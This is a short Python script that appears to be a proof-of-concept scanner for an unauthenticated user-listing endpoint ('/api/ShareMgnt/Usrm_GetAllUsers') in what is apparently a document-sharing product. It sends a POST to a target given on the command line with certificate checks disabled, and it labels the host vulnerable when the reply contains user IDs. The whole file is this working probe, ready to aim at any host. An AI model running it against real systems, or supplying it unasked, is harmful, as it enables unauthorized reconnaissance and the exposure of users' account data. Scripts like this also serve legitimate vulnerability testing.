import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def main():
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    parser = argparse.ArgumentParser(description='Send POST request to specified URL or file')
    parser.add_argument('-u', '--url', help='URL to send POST request to')
    args = parser.parse_args()

    url = args.url + '/api/ShareMgnt/Usrm_GetAllUsers'
    response = requests.post(url, data="[1, 10]", verify=False,timeout=1)
    if 'id' in response.text:
        print(url + '存在漏洞！')

if __name__ == "__main__":
    main()